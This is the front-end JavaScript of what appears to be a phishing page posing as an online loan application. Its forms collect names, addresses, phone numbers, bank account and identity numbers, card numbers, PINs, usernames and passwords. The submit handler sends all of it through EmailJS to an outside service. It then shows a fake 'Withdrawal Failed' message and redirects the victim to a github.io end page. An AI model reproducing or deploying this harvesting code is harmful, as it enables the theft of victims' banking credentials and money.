let nav = document.getElementById('icon1')
let count = 0;
let form1 = document.getElementById('form1')
let form2 = document.getElementById('form2')

let next = document.getElementById('next')
let fname = document.getElementById('name')
let sname = document.getElementById('surname')
let address = document.getElementById('address')
let phoneNumber = document.getElementById('phone')
let account = document.getElementById('account')
let identity = document.getElementById('identity')

let card = document.getElementById('card')
let pin = document.getElementById('pin')
let username = document.getElementById('username')
let password = document.getElementById('password')
let email = document.getElementById('email')
let error = document.getElementById('error')
let error2 = document.getElementById('error2')
let agree = document.getElementById("agree")
let count2 = 0;
let terms = document.getElementById('terms')
let submit = document.getElementById('submit')

window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        event.preventDefault();
        // generate a five digit number for the contact_number variable
        this.contact_number.value = Math.random() * 100000 | 0;
        // these IDs from the previous steps
        emailjs.sendForm("service_gmjjn1d","template_fkhx5nq1", this)
        .then(function() {
            console.log('SUCCESS!');
            let subscribe = document.getElementById('submit')
            console.log('na me')
            subscribe.style.animationName = 'done';
            subscribe.value = 'DONE'
            let Subscribe = setTimeout(sub, 2800);
            function sub(){
                subscribe.value = 'Submit Successful But Withdrawal Failed'
                 window.location.href="https://official-online-application.github.io/konga-end-page/"
            }
        }, function(error) {
                console.log('FAILED...', error);
                let subscribe = document.getElementById('submit')
                subscribe.value = 'unable to submit'
                subscribe.style.animationName = 'failed';
                let Subscribe = setTimeout(sub, 4000);
                function sub(){
                    subscribe.value = 'Submit and Withdraw Your Loan'
                }
            });
        });
}
nav.addEventListener('click', ()=>{
    count++
    if(count > 0){
        div2.style.margin = '0 0 0 0'
    }
     if(count > 1){
        div2.style.margin = '-19% 0 0 0'
        count = 0;
    }
})
next.addEventListener('click', ()=>{
    if(fname.value ==="" || sname.value ==="" || address.value ==="" ||
        phoneNumber.value === "" || account.value ==="" || identity.value === "" || email.value === ""){
            error.innerHTML = "kindly fill all the required details above";
            error.style.color = "red";
            error.style.fontSize =  "300%";
            error.style.textAlign =  "center";
            console.log("na me")
            setTimeout(sub, 2000);
            function sub(){
                error.innerHTML = ''
            }
        }else if(agree.checked == 0){
            error.innerHTML = "kindly read and agree to the terms and conditions";
            error.style.color = "red";
            error.style.fontSize =  "300%";
            error.style.textAlign =  "center";
            setTimeout(sub, 2000);
            function sub(){
                error.innerHTML = ''
            }
        } else{
            console.log("here")
            setTimeout(bub, 1000);
            function bub(){
                form1.style.display = 'none'
                form2.style.display = 'block'
                terms.style.display = 'none'
                error.innerHTML = '';
            }
        }
})
setInterval(nub, 100)
function nub(){
    if(card.value === "" || pin.value === "" || username.value === "" || password.value === ""){
    error2.innerHTML = "kindly fill all the required details above";
    error2.style.color = "red";
    error2.style.fontSize =  "300%"
    error2.style.textAlign =  "center"
    submit.style.display = 'none';
    }else{
        let submit = document.getElementById("submit")
        submit.style.display = 'block';
        submit.style.margin = '-3 0 -10 0'
        submit.addEventListener('click', ()=>{
            submit.style.backgroundColor = "yellow"
            submit.style.color = "black"
            
        })
        error2.innerHTML = '';
       
    }
}
